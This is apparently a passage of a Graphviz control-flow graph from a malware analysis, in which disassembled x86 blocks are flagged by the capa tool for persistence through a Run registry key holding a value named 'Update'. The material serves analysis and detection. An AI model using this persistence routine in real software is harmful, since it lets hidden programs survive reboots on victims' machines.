	158 -> 158	[pos="e,3064.4,6102.7 3064.4,6156.3 3104.4,6228 3166,6219.1 3166,6129.5 3166,6043.9 3109.8,6032 3069.9,6093.5"];
	161	[height=0.94444,
		label="push    ebp\lcall    esi ; InternetCloseHandle\lpush    ebx\ljmp     short loc_403BE7\l",
		pos="2894,5549.5",
		width=3.3611];
	158 -> 161	[pos="e,2903.1,5583.7 3044.9,6102.5 3020.1,6011.8 2937.1,5708 2905.9,5594.1"];
	165	[height=0.52778,
		label="call    esi ; InternetCloseHandle\ljmp     short loc_403B72\l",
		pos="3052,5292",
		width=3.3611];
	158 -> 165	[pos="e,3049.8,5311.4 3049.5,6102.6 3043.9,5979.2 3043.8,5451.9 3049.3,5322"];
	161 -> 165	[pos="e,3040.8,5311.2 2914.7,5515.1 2946.2,5464.1 3005.8,5367.7 3035,5320.5"];
	165 -> 158	[pos="e,3054.5,6102.6 3054.2,5311.4 3060,5416.9 3060.3,5946.5 3055,6091.6"];
	169	[fillcolor=red,
		height=1.8056,
		label="lea     eax, [esp+14h+var_4]\lpush    eax\lpush    ebp\lpush    ebx\lcall    ds:RegCreateKeyA\l\l\lCAPA: persist via Run registry \
key",
		pos="3342,6129.5",
		style=filled,
		width=3.6528];
	170	[fillcolor=red,
		height=4.3472,
		label="push    esi\lpush    edi\lpush    1\lpop     esi\lpush    esi\lpush    0\lpush    offset aUpdate; \"Update\"\lpush    [esp+28h+var_\
4]\lcall    ds:RegSetValueExW\ltest    eax, eax\ljz      short loc_403C86\l\l\lCAPA: create or open registry key\l\lCAPA: set registry \
value\l\lCAPA: persist via Run registry key\l\lCAPA: persist via Run registry key",
		pos="3342,5549.5",
		style=filled,
		width=3.6528];
	169 -> 170	[pos="e,3342,5706.2 3342,6064.2 3342,5980.9 3342,5832.8 3342,5717"];
	171	[fillcolor=red,
		height=0.97222,
		label="xor     esi, esi\l\l\lCAPA: set registry value",
		pos="3314,5292",
		style=filled,
		width=2.6389];
	170 -> 171	[color=red,
		label=false,
		lp="3340,5367.5",
		pos="e,3317.7,5327.2 3324.9,5392.5 3322.7,5372.6 3320.6,5353.6 3318.9,5337.7"];
	172	[fillcolor=red,
		height=2.6389,
		label="push    [esp+14h+var_4]\lcall    ds:RegCloseKey\lmov     eax, esi\lpop     edi\lpop     esi\lpop     ebp\lpop     ebx\lpop     ecx\lretn\l\l\lCAPA: \
set registry value",
		pos="3406,5080",
		style=filled,
		width=2.6944];
	170 -> 172	[color=darkgreen,
		label=true,
		lp="3440.5,5292",
		pos="e,3420.3,5175.3 3405.9,5392.5 3410.8,5375.7 3415,5358.6 3418,5342 3427.1,5291.1 3425.7,5233.9 3421.4,5186"];
	171 -> 172	[pos="e,3364.6,5175.5 3329,5256.8 3337.6,5237.1 3349,5211.2 3360.3,5185.4"];
	190	[height=0.52778,
		label="movzx   eax, [ebp+var_2C]\ljmp     short loc_403DE0\l",
		pos="3596,5549.5",
		width=2.8889];
	192	[height=0.73611,
		label="inc     esi\lmov     [ebp+var_74], esi\ljmp     short loc_403DD2\l",
		pos="3596,6129.5",
		width=2.7083];
	192 -> 190	[pos="e,3596,5568.8 3596,6102.5 3596,6007.6 3596,5679.3 3596,5579.5"];
	192 -> 192	[pos="e,3608.5,6102.7 3608.5,6156.3 3649.1,6228 3711.5,6219.1 3711.5,6129.5 3711.5,6043.9 3654.6,6032 3614.1,6093.5"];
}
